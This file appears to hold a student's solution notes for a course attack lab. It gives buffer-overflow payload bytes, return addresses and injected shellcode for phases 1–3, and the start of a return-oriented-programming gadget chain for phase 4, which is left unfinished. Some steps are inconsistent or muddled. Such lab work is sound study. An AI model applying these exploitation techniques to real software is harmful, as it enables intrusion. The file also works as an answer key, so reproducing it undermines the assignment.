@@ -1,0 +1,110 @@
+PHASE 1
+
+$objdump -d rtarget > rtarget_dump.txt
+- find the buffer in getbuf function:
+    sub $0x28 = 40 in decimal
+    00 = 1 byte
+    need 40 bytes of 00
+//to fill the stack so touch1 address will be in the return of the stack
+
+- find the adress of touch1 
+    90 13 40 00 00 00 00 00
+//to call function touch1
+    
+$vim phase1.txt
+- place these values in phase1.txt file
+
+$./hex2raw < phase.txt > phase1.data
+$./ctarget < phase1.data
+Cookie: 0x3af5af1d
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
+======================================================================================================================================================================================================================================================================================================
+
+PHASE 2
+
+first line of answer should set the cookie
+48 c7 c7 1d af f5 3a c3
+//this is the input of touch2
+
+32 bits of buffer
+//to get to correct location of stack
+register of rsp --> stack pointer
+88 24 68 55 00 00 00 00
+//to access the top of the stack 
+
+address of touch2
+bc 13 40 00 00 00 00 00
+//calls the function touch2 when stack is returned
+
+======================================================================================================================================================================================================================================================================================================
+
+PHASE 3
+
+0x28 (buffer size) + 8 bytes return address of rsp (of getbuf) + 8 bytes for touch3
+= 0x38 
+
+0x38 + address of rsp = $0x556824c0
+
+assembly code
+movq $0x556824c0,rdi
+retq
+
+$ gcc -c phase3.s
+$ objdump -d phase3.o
+
+phase3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 c0 24 68 55    mov    $0x556824c0,%rdi
+   7:   c3                      retq
+   
+1st 8 bytes of stack
+***********putting rdi outside stack to avoid getting overwritten
+48 c7 c7 1d af f5 3a c3
+//this is the char *sval input
+
+add 32 bytes for buffer
+//to fill up the area before u go to the rsp
+
+return address of rsp --> stack pointer
+88 24 68 55 00 00 00 00
+//to access the top of the stack 
+
+address of touch3
+cd 14 40 00 00 00 00 00
+//to call function touch3 when stack is returned
+
+convert cookie from hex to text to get the cookie string in the return of touch3
+*******Takes cookie string as touch3 argument and moves it to rdi to hold 
+3af5af1d --> 33 61 66 35 61 66 31 64
+//do this b/c u want the hex value of the cookie to match sval which is a char data type
+
+
+RECITATION EXPLINATION
+- similar to phase2
+======================================================================================================================================================================================================================================================================================================
+
+PHASE 4 --> Don't understand this function
+
+buffer
+gadget 1: popq %rax
+pop rax b/c that's the only way to put the cookie into rdi
+=> search for 58
+    - add the position in the instruction to the address
+    - this gives the address for the popq instruction 
+value of cookie
+rax holds address of cookie now
+gadget 2: movq %rax, %rdi
+place cookie value into rdi so touch 2 can compare rdi w/ cookie val
+==> search for 48 89 c7 (from the table in the handout)
+    - add the position of the start of the instruction to the address of the
+      line
+    - This gives the address for the movq %rax,%rdi instruction
+address of touch2
